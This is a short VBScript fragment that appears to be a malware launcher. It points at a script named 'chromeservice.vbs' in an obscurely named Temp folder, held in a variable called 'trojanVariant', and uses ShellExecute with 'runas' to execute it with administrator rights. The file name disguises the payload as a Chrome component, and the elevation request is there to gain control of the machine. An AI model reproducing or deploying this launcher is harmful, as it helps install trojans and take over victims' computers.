set objShell = createobject("Shell.Application")
dim trojanVariant
 trojanVariant="C:\Users\%username%\AppData\Local\Temp\01e32u82610.182190b127\chromeservice.vbs" 
 ObjShell.ShellExecute "wscript.exe", """" & trojanVariant & """ RunAsAdministrator", , "runas", 1  